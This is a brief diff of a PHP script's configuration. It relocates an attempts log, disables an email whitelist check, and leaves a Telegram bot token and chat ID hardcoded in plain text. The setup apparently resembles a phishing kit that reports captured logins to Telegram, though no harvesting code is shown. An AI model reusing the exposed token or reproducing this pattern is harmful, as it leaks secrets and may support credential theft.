@@ -1,9 +1,9 @@
 <?php
 session_start();
-define('ATTEMPTS_FILE', __DIR__ . '/data/attempts.json');
+define('ATTEMPTS_FILE', '/data/attempts.json'); // persistent Railway volume
 
 // === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = true; // set to true to ENFORCE whitelist in papa.txt
+$EMAIL_VALIDATION_ENABLED = false; // set to true to ENFORCE whitelist in papa.txt
 
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
